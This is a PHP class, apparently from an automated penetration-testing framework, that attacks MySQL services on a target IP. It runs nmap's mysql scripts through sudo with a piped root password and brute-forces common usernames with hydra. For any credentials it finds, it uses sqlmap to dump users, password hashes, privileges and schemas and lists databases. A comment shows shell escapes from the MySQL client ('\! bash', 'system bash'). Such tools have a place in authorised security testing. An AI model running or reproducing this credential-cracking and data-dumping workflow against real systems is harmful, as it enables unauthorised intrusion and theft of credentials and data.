<?php


class service2mysql extends SERVICE {

/*
 https://www.exploit-db.com/exploits/23081     MySQL - Remote User Enumeration  (from mysql 4.x and below to a mysql 5.x server)
 https://gist.github.com/hofmannsven/9164408
 MariaDB [bot]> \! bash
rohff@prof:~$ exit
exit
MariaDB [bot]>

MariaDB [bot]> system ls -l
mysql> system bash
 *
 *
 */
    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf);
    }


public function service2mysql4exec(){
    $result = "";

        $result .= $this->ssTitre(__FUNCTION__);
        // heavly process 
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"mysql-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
        //$result .= $this->cmd("localhost",$query);$result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
        $this->pause();
        $users_test = array("mysql","mysqld","mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
        foreach ($users_test as $user_test){
           $result .= $this->port2auth4pass4hydra("mysql",$user_test,"password");
        }
        $this->pause();
        //$query = "patator mysql_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='Access denied for user' ";
        //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
        
        $users = $this->ip2users4passwd();
        foreach ($users as $user2name => $user2pass){            
            if (!empty($user2name)) {
                $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
                $query = "sqlmap -d \"mysql://$user2name:$user2pass@$this->ip:$this->port/information_schema\" -f --users --passwords --privileges --schema --comments --answers=Y --batch --disable-coloring ";
                $result .= $this->req_ret_str($query);
                $result .= $this->req_ret_str("mysql --batch --force --host=$this->ip --port=$this->port --user=$user2name --password=$user2pass --connect-timeout=30 --execute=\"show databases;show processlist ;\" --quick --silent 2>/dev/null");
                }
        }
        
        $this->pause();
    
        return $result;
    
}



  }
?>
